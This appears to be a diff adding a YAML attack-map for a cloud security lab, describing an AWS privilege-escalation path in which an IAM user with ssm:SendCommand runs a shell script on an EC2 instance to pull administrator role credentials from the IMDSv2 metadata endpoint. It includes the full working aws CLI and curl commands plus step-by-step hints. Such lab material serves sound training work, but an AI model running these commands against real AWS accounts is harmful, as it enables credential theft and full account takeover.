@@ -1,0 +1,75 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ssm-002-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has ssm:SendCommand permission allowing it to execute arbitrary
+        shell commands on EC2 instances in the account, including the target instance
+        that carries an administrative IAM role.
+
+    - id: ec2-instance
+      label: "EC2 Instance"
+      type: resource
+      subType: ec2-instance
+      arn: "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx"
+      description: >
+        This EC2 instance is running the SSM agent, making it reachable via
+        ssm:SendCommand. It has an instance profile that grants it an administrative
+        IAM role, meaning any process running on it — including commands you send via
+        SSM — can retrieve temporary admin credentials from the IMDSv2 metadata endpoint.
+
+    - id: target-role
+      label: "EC2 Admin Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ssm-002-to-admin-ec2-admin-role"
+      description: >
+        This IAM role is attached to the EC2 instance via an instance profile and
+        has AdministratorAccess. By extracting the temporary credentials from the
+        instance metadata service and exporting them locally, you can perform any
+        action in the AWS account as a full administrator.
+
+  edges:
+    - from: starting-principal
+      to: ec2-instance
+      label: "ssm:SendCommand"
+      description: >
+        Send a shell command to the EC2 instance via AWS Systems Manager. The command
+        fetches temporary credentials from the instance metadata service using IMDSv2
+        and returns them in the command output.
+      hints:
+        - "You can execute remote commands on EC2 instances without needing SSH access."
+        - "Look for EC2 instances that have privileged IAM roles attached via instance profiles."
+        - "Once you can run commands on the instance, the metadata service at 169.254.169.254 can hand you temporary credentials for whatever role is attached."
+        - "Browse to https://pathfinding.cloud/paths/ssm-002 for technique details."
+      commands:
+        - description: "Discover EC2 instances with privileged roles"
+          command: "aws ec2 describe-instances --filters 'Name=instance-state-name,Values=running' --query 'Reservations[*].Instances[*].[InstanceId,IamInstanceProfile.Arn]' --output table"
+        - description: "Send command to extract instance role credentials via IMDSv2"
+          command: "aws ssm send-command --instance-ids i-xxxxxxxxx --document-name AWS-RunShellScript --parameters 'commands=[\"TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \\\"X-aws-ec2-metadata-token-ttl-seconds: 21600\\\"); ROLE=$(curl -s -H \\\"X-aws-ec2-metadata-token: $TOKEN\\\" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H \\\"X-aws-ec2-metadata-token: $TOKEN\\\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\"]' --query 'Command.CommandId' --output text"
+        - description: "Retrieve the command output containing the credentials"
+          command: "aws ssm list-command-invocations --command-id <COMMAND_ID> --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text"
+
+    - from: ec2-instance
+      to: target-role
+      label: "IMDSv2 metadata"
+      description: >
+        The shell command executing on the EC2 instance calls the instance metadata
+        service endpoint to retrieve the temporary access key, secret key, and session
+        token for the attached admin role. These credentials are returned in the SSM
+        command output and can then be exported and used locally.
+      hints:
+        - "The instance metadata endpoint at http://169.254.169.254/latest/meta-data/iam/security-credentials/ lists the attached role."
+        - "Use IMDSv2: first obtain a session token with a PUT request, then include it as a header when fetching credentials."
+      commands: []
